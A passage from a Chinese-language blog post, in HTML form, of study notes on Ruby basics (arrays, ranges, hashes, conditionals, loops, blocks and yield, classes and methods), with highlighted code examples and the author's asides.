在最後⾯加入</span></span><br><span class="line">puts pokemon.length <span class="comment"># 印出 5</span></span><br><span class="line">pokemon.push(<span class="string">&#x27;小霞&#x27;</span>) <span class="comment"># 最後面加入</span></span><br><span class="line">puts pokemon.length <span class="comment"># 印出 6</span></span><br><span class="line">puts pokemon <span class="comment"># 經過上面處理印出 皮卡丘, 傑尼龜, 妙蛙種子, 小火龍, 小智, 小霞</span></span><br></pre></td></tr></table></figure><blockquote><p>话说台湾同胞都喜欢神奇宝贝嘛？！看见好几个了。</p></blockquote><h2 id="map-方法"><a href="#map-方法" class="headerlink" title="map 方法"></a>map 方法</h2><p><code>|x|</code> 代表传递给某个代码块的局部变量。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">p a.map &#123; |<span class="params">x</span>| x*<span class="number">2</span> &#125;</span><br><span class="line"><span class="comment"># 印出 [2, 4, 6]</span></span><br></pre></td></tr></table></figure><h2 id="select-方法"><a href="#select-方法" class="headerlink" title="select 方法"></a>select 方法</h2><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>]</span><br><span class="line">p a.select &#123; |<span class="params">x</span>| x &lt; <span class="number">5</span> &#125;</span><br><span class="line"><span class="comment"># 印出 [1, 2, 3, 4]</span></span><br></pre></td></tr></table></figure><h2 id="reduce-方法"><a href="#reduce-方法" class="headerlink" title="reduce 方法"></a>reduce 方法</h2><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>]</span><br><span class="line">p a.reduce &#123; |<span class="params">sum, n</span>| sum + n &#125; <span class="comment"># p a.sum</span></span><br><span class="line"><span class="comment"># 印出 55</span></span><br></pre></td></tr></table></figure><h1 id="范围-Range"><a href="#范围-Range" class="headerlink" title="范围 Range"></a>范围 Range</h1><p><code>..</code> 少一点多一点，<code>...</code> 多一点少一点。 emmmm，6，同胞真是太幽默了。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 少一點多一點 (包含頭尾)</span></span><br><span class="line">puts (<span class="number">1</span>..<span class="number">10</span>).to_a <span class="comment"># 印出 1 ~ 10 [1, 10]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 多一點少一點 (不含尾)</span></span><br><span class="line">puts (<span class="number">1</span>...<span class="number">10</span>).to_a <span class="comment"># 印出 1 ~ 9 [1, 10)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># * 可以展開範圍</span></span><br><span class="line">p *<span class="number">1</span>..<span class="number">10</span> <span class="comment"># 依序印出1~10</span></span><br><span class="line">p [*<span class="number">1</span>..<span class="number">10</span>] <span class="comment"># 印出 [1,2,3,4,5,6,7,8,9,10]</span></span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># map 對範圍內每個數值做x+1處理後回傳陣列</span></span><br><span class="line">p [*<span class="number">1</span>..<span class="number">10</span>].map &#123; |<span class="params">x</span>| x+<span class="number">1</span>&#125; <span class="comment"># [2,3,4,5,6,7,8,9,10,11]</span></span><br><span class="line">p (<span class="number">1</span>..<span class="number">10</span>).to_a.map &#123; |<span class="params">x</span>| x+<span class="number">1</span>&#125; <span class="comment"># 效果同上</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 字母也可以用大小來判斷呢，想像每個英文字母依照順序是有大小之分，越後面數值越大。 select可以挑選符合條件的元素形成陣列回傳</span></span><br><span class="line">p (<span class="string">&quot;a&quot;</span>..<span class="string">&quot;g&quot;</span>).to_a.select &#123; |<span class="params">chars</span>| chars &lt; <span class="string">&quot;c&quot;</span>&#125; <span class="comment"># 取出小於&quot;c&quot; 的就會得到 [&quot;a&quot;,&quot;b&quot;]</span></span><br></pre></td></tr></table></figure><h1 id="哈希-hash"><a href="#哈希-hash" class="headerlink" title="哈希 hash"></a>哈希 hash</h1><p>字典？</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">profile = &#123; <span class="symbol">:name</span> =&gt; <span class="string">&#x27;caishao&#x27;</span>, <span class="symbol">:age</span> =&gt; <span class="number">20</span> &#125; <span class="comment"># 旧写法</span></span><br><span class="line">profile = &#123; <span class="symbol">name:</span> <span class="string">&#x27;caishao&#x27;</span>, <span class="symbol">age:</span> <span class="number">20</span> &#125; <span class="comment"># 新写法</span></span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">profile = &#123; <span class="symbol">name:</span> <span class="string">&#x27;caishao&#x27;</span>, <span class="symbol">age:</span> <span class="number">20</span> &#125;</span><br><span class="line">puts profile[<span class="string">&quot;name&quot;</span>] <span class="comment"># nil</span></span><br><span class="line">puts profile[<span class="symbol">:name</span>] <span class="comment"># caishao</span></span><br><span class="line">profile.keys <span class="comment">#拿取所有key =&gt; [:name, :age]</span></span><br><span class="line">profile.values <span class="comment">#拿取所有value =&gt; [&quot;caishao&quot;, 20]</span></span><br><span class="line">character[<span class="symbol">:power</span>] = <span class="number">100</span></span><br><span class="line">p character <span class="comment">#&#123;:name=&gt;&quot;caishao&quot;, :age=&gt;20, :power=&gt;100&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">profile = &#123;<span class="symbol">name:</span> <span class="string">&quot;Sean&quot;</span>, <span class="symbol">age:</span> <span class="number">25</span>, <span class="symbol">power:</span><span class="number">100</span>, <span class="symbol">ability:</span> <span class="string">&quot;Ruby&quot;</span>&#125;</span><br><span class="line">p profile.length <span class="comment"># 4</span></span><br><span class="line">p profile.size <span class="comment"># 4</span></span><br></pre></td></tr></table></figure><h1 id="分支"><a href="#分支" class="headerlink" title="分支"></a>分支</h1><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">age = <span class="number">10</span></span><br><span class="line"><span class="keyword">if</span> age &gt;= <span class="number">0</span> &amp;&amp; age&lt;=<span class="number">10</span></span><br><span class="line">  puts <span class="string">&quot;小学生&quot;</span> <span class="comment"># 年齡&gt;=0 且&lt;=3 就印</span></span><br><span class="line"><span class="keyword">elsif</span> age &gt;= <span class="number">11</span> &amp;&amp; age&lt;=<span class="number">17</span></span><br><span class="line">  puts <span class="string">&quot;青少年&quot;</span> <span class="comment"># 年齡&gt;=11 且&lt;=17 就印</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  puts <span class="string">&quot;成年&quot;</span> <span class="comment">#上述以外的條件都印這個</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>unless &#x3D; if not</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unless</span> age &gt;=<span class="number">18</span> <span class="comment"># unless = if not</span></span><br><span class="line">  puts <span class="string">&quot;未成年&quot;</span> <span class="comment">#如果年齡沒有大於等於18 才印出</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>三目运算</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">status = (age&gt;=<span class="number">18</span>)? <span class="string">&quot;成年&quot;</span><span class="symbol">:<span class="string">&quot;未成年&quot;</span></span> <span class="comment"># 三目运算</span></span><br></pre></td></tr></table></figure><p>case when，可使用范围。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">age = <span class="number">20</span></span><br><span class="line"><span class="keyword">case</span> age</span><br><span class="line"><span class="keyword">when</span> <span class="number">0</span>..<span class="number">10</span></span><br><span class="line">  puts <span class="string">&quot;小学生&quot;</span></span><br><span class="line"><span class="keyword">when</span> <span class="number">11</span>..<span class="number">17</span></span><br><span class="line">  puts <span class="string">&quot;青少年&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  puts <span class="string">&quot;成年&quot;</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h1 id="迭代-Loop-and-Iteration"><a href="#迭代-Loop-and-Iteration" class="headerlink" title="迭代 Loop and Iteration"></a>迭代 Loop and Iteration</h1><p>for 循环：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">names = [<span class="string">&quot;Sean&quot;</span>, <span class="string">&quot;Ken&quot;</span>, <span class="string">&quot;John&quot;</span>, <span class="string">&quot;Tom&quot;</span>]</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> names</span><br><span class="line">  puts name</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 印出&quot;Sean&quot;, &quot;Ken&quot;, &quot;John&quot;, &quot;Tom&quot;</span></span><br></pre></td></tr></table></figure><p>while 循环：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> x &lt; <span class="number">10</span> <span class="comment">#結束條件</span></span><br><span class="line">  puts x</span><br><span class="line">  x += <span class="number">1</span> <span class="comment">#改變條件</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="comment">#依序印出 1~9</span></span><br></pre></td></tr></table></figure><p>until 循环，until &#x3D; while not：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="number">0</span></span><br><span class="line"><span class="keyword">until</span> x &gt;= <span class="number">10</span> <span class="comment">#結束條件</span></span><br><span class="line">  puts x</span><br><span class="line">  x += <span class="number">1</span> <span class="comment">#改變條件</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="comment"># 印出1~9 (大於等於10就停止)</span></span><br></pre></td></tr></table></figure><p>loop 循环：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">i = <span class="number">0</span></span><br><span class="line">loop <span class="keyword">do</span></span><br><span class="line">  puts i</span><br><span class="line">  i += <span class="number">1</span> <span class="comment"># 改變條件</span></span><br><span class="line">  <span class="keyword">break</span> <span class="keyword">if</span> i &gt; <span class="number">10</span> <span class="comment"># 終止條件</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="comment"># 印出1~9</span></span><br></pre></td></tr></table></figure><p>ruby 中 <code>do-end</code> 或 <code>&#123;&#125;</code> 均可以表示代码块，二者可相互替换。loop 循环可理解为：<code>loop</code> + 代码块</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">i = <span class="number">0</span></span><br><span class="line">loop &#123;</span><br><span class="line">  puts i</span><br><span class="line">  i += <span class="number">1</span> <span class="comment"># 改變條件</span></span><br><span class="line">  <span class="keyword">break</span> <span class="keyword">if</span> i &gt; <span class="number">10</span> <span class="comment"># 終止條件</span></span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment"># 印出1~9</span></span><br></pre></td></tr></table></figure><p>ruby 中数字也是对象，可对其使用方法，<code>.times&#123;&#125;</code> <code>.upto()</code> <code>.downto()</code></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1 .times&#123;&#125; 執行特定次數 (大括號可換用 do...end)</span></span><br><span class="line"><span class="number">5</span>.times&#123;puts <span class="string">&quot;hello&quot;</span>&#125;</span><br><span class="line"><span class="number">5</span>.times <span class="keyword">do</span></span><br><span class="line">  puts <span class="string">&quot;hello&quot;</span></span><br><span class="line"><span class="keyword">end</span> <span class="comment"># 印出 5次&quot;hello&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#2 .upto() 由小到大(想像.upto後面用小括號接參數)</span></span><br><span class="line"><span class="number">1</span>.upto(<span class="number">10</span>) <span class="keyword">do</span> |<span class="params">i</span>|</span><br><span class="line">  puts <span class="string">&quot;hello, ruby <span class="subst">#&#123;i&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#3 .downto() 由大到小</span></span><br><span class="line"><span class="number">10</span>.downto(<span class="number">1</span>) <span class="keyword">do</span> |<span class="params">i</span>|</span><br><span class="line">  puts <span class="string">&quot;hello, ruby <span class="subst">#&#123;i&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>迭代：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># each</span></span><br><span class="line">names = [<span class="string">&quot;Sean&quot;</span>, <span class="string">&quot;Ken&quot;</span>, <span class="string">&quot;John&quot;</span>, <span class="string">&quot;Tom&quot;</span>]</span><br><span class="line">x = <span class="number">0</span></span><br><span class="line">names.each <span class="keyword">do</span> |<span class="params">name</span>|</span><br><span class="line">  puts <span class="string">&quot;<span class="subst">#&#123;x&#125;</span> <span class="subst">#&#123;name&#125;</span>&quot;</span></span><br><span class="line">  x += <span class="number">1</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="comment"># 印出 0 Sean, 1 Ken, 2 John, 3 Tom</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># each_with_index ，效果同上</span></span><br><span class="line">names = [<span class="string">&quot;Sean&quot;</span>, <span class="string">&quot;Ken&quot;</span>, <span class="string">&quot;John&quot;</span>, <span class="string">&quot;Tom&quot;</span>]</span><br><span class="line">x = <span class="number">0</span></span><br><span class="line">names.each_with_index <span class="keyword">do</span> |<span class="params">name, x</span>|</span><br><span class="line">  puts <span class="string">&quot;<span class="subst">#&#123;x&#125;</span> <span class="subst">#&#123;name&#125;</span>&quot;</span></span><br><span class="line">  x += <span class="number">1</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="comment"># 印出 0 Sean, 1 Ken, 2 John, 3 Tom</span></span><br></pre></td></tr></table></figure><h1 id="代码块-block"><a href="#代码块-block" class="headerlink" title="代码块 block"></a>代码块 block</h1><p>block 可以传递参数，<code>|n|</code> 代表传递给某个代码块的局部变量。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># test two 方法後面接上block，&#123;&#125;內的判斷就成為最後的回傳</span></span><br><span class="line"><span class="comment"># yield後面帶入的參數會影響下方&#123;&#125;內判斷結果，再回到原本方法去判斷是要印出哪個內容</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_two</span></span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">yield</span>(<span class="number">2</span>)</span><br><span class="line">    puts <span class="string">&quot;yes, it is 2&quot;</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    puts <span class="string">&quot;no, it is not 2&quot;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">test_two &#123;|<span class="params">n</span>| n == <span class="number">2</span> &#125;</span><br></pre></td></tr></table></figure><p>执行到 <code>yield(2)</code> 时，会先执行代码块 <code>&#123;|n| n == 2 &#125;</code> 的内容，并将参数 2 传递过去。感觉 <code>yield</code> 其实就是个可传参的<strong>代码占位符</strong>？</p><p><code>do-end</code> 和 <code>&#123;&#125;</code> 的区别：</p><ol><li>优先级不同</li><li>没啥区别了，多行建议用 <code>do-end</code> 单行用 <code>&#123;&#125;</code><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">p [*<span class="number">1</span>..<span class="number">10</span>].map &#123; |<span class="params">i</span>| i * <span class="number">2</span> &#125;</span><br><span class="line"><span class="comment"># =&gt; 得到 [2, 4, 6, 8, 10, 12, 14, 16, 18, 20] &#123;&#125; 優先度高</span></span><br><span class="line"></span><br><span class="line">p [*<span class="number">1</span>..<span class="number">10</span>].map <span class="keyword">do</span> |<span class="params">i</span>| i * <span class="number">2</span> <span class="keyword">end</span></span><br><span class="line"><span class="comment"># =&gt; 得到 &lt;Enumerator: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]:map&gt; do...end 優先度低，</span></span><br><span class="line"><span class="comment"># 可以還原成 (p [*1..10].map) do |i| i * 2 end，括號內先執行完，所以後面的條件沒有被帶入執行。</span></span><br></pre></td></tr></table></figure></li></ol><h1 id="类-对象"><a href="#类-对象" class="headerlink" title="类 &amp; 对象"></a>类 &amp; 对象</h1><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env ruby</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MegaGreeter</span></span><br><span class="line">  <span class="built_in">attr_accessor</span> <span class="symbol">:names</span> <span class="comment"># 允许使用 mg.names 访问属性 names</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Create the object</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">names = <span class="string">&quot;World&quot;</span></span>) <span class="comment"># 构造方法</span></span><br><span class="line">    <span class="variable">@names</span> = names</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Say hi to everybody</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">say_hi</span></span><br><span class="line">    <span class="keyword">if</span> <span class="variable">@names</span>.<span class="literal">nil</span>?</span><br><span class="line">      puts <span class="string">&quot;...&quot;</span></span><br><span class="line">    <span class="keyword">elsif</span> <span class="variable">@names</span>.respond_to?(<span class="string">&quot;each&quot;</span>)</span><br><span class="line">      <span class="comment"># <span class="doctag">@names</span> is a list of some kind, iterate!</span></span><br><span class="line">      <span class="variable">@names</span>.each <span class="keyword">do</span> |<span class="params">name</span>|</span><br><span class="line">        puts <span class="string">&quot;Hello <span class="subst">#&#123;name&#125;</span>!&quot;</span></span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      puts <span class="string">&quot;Hello <span class="subst">#&#123;<span class="variable">@names</span>&#125;</span>!&quot;</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Say bye to everybody</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">say_bye</span></span><br><span class="line">    <span class="keyword">if</span> <span class="variable">@names</span>.<span class="literal">nil</span>?</span><br><span class="line">      puts <span class="string">&quot;...&quot;</span></span><br><span class="line">    <span class="keyword">elsif</span> <span class="variable">@names</span>.respond_to?(<span class="string">&quot;join&quot;</span>)</span><br><span class="line">      <span class="comment"># Join the list elements with commas</span></span><br><span class="line">      puts <span class="string">&quot;Goodbye <span class="subst">#&#123;<span class="variable">@names</span>.join(<span class="string">&quot;, &quot;</span>)&#125;</span>.  Come back soon!&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      puts <span class="string">&quot;Goodbye <span class="subst">#&#123;<span class="variable">@names</span>&#125;</span>.  Come back soon!&quot;</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 指明文件执行入口</span></span><br><span class="line"><span class="keyword">if</span> <span class="variable constant_">__FILE__</span> == <span class="variable">$0</span> <span class="comment"># 类似 python if &quot;__name__&quot; == &quot;__main__&quot;:</span></span><br><span class="line">  mg = <span class="title class_">MegaGreeter</span>.new</span><br><span class="line">  mg.say_hi</span><br><span class="line">  mg.say_bye</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Change name to be &quot;Zeke&quot;</span></span><br><span class="line">  mg.names = <span class="string">&quot;Zeke&quot;</span></span><br><span class="line">  mg.say_hi</span><br><span class="line">  mg.say_bye</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Change the name to an array of names</span></span><br><span class="line">  mg.names = [<span class="string">&quot;Albert&quot;</span>, <span class="string">&quot;Brenda&quot;</span>, <span class="string">&quot;Charles&quot;</span>,</span><br><span class="line">              <span class="string">&quot;Dave&quot;</span>, <span class="string">&quot;Engelbert&quot;</span>]</span><br><span class="line">  mg.say_hi</span><br><span class="line">  mg.say_bye</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Change to nil</span></span><br><span class="line">  mg.names = <span class="literal">nil</span></span><br><span class="line">  mg.say_hi</span><br><span class="line">  mg.say_bye</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>输出:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Hello World!</span><br><span class="line">Goodbye World.  Come back soon!</span><br><span class="line">Hello Zeke!</span><br><span class="line">Goodbye Zeke.  Come back soon!</span><br><span class="line">Hello Albert!</span><br><span class="line">Hello Brenda!</span><br><span class="line">Hello Charles!</span><br><span class="line">Hello Dave!</span><br><span class="line">Hello Engelbert!</span><br><span class="line">Goodbye Albert, Brenda, Charles, Dave, Engelbert.  Come</span><br><span class="line">back soon!</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>实例方法和类别方法：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Human</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">name</span>)</span><br><span class="line">    <span class="variable">@name</span> = name</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># 实例方法，作用在实例对象上</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">my_name</span></span><br><span class="line">    puts <span class="string">&quot;I&#x27;m <span class="subst">#&#123;<span class="variable">@name</span>&#125;</span>.&quot;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># 类别方法，作用在类上</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">self</span>.say_hi</span><br><span class="line">    puts <span class="string">&quot;hi 我是類別方法&quot;</span></span><br><span class="line">  <span class="keyword">end</span>  </span><br><span class="line">  <span class="comment"># class &lt;&lt; self</span></span><br><span class="line">  <span class="comment">#   def all</span></span><br><span class="line">  <span class="comment">#   end</span></span><br><span class="line">  <span class="comment"># end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Sean</span> = <span class="title class_">Human</span>.new(<span class="string">&#x27;Sean&#x27;</span>)</span><br><span class="line">麥克 = <span class="title class_">Human</span>.new(<span class="string">&#x27;麥克&#x27;</span>)</span><br><span class="line"></span><br><span class="line">＃實體方法 instance method</span><br><span class="line"><span class="title class_">Sean</span>.my_name <span class="comment"># =&gt; I&#x27;m Sean.</span></span><br><span class="line">麥克.my_name <span class="comment"># =&gt; I&#x27;m 麥克.</span></span><br><span class="line"><span class="title class_">Human</span>.my_name <span class="comment"># =&gt; 出錯（NoMethodError）</span></span><br><span class="line"></span><br><span class="line">＃類別方法 <span class="keyword">class</span> method</span><br><span class="line"><span class="title class_">Human</span>.say_hi <span class="comment"># =&gt; hi 我是類別方法</span></span><br><span class="line"><span class="title class_">Sean</span>.say_hi <span class="comment"># =&gt; 出錯（NoMethodError），實體沒辦法使用</span></span><br></pre></td></tr></table></figure><p>继承：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">eat</span>(<span class="params">food</span>)</span><br><span class="line">    puts <span class="string">&quot;<span class="subst">#&#123;food&#125;</span> 也太好吃了吧!!&quot;</span></span><br><span class="line">  <span 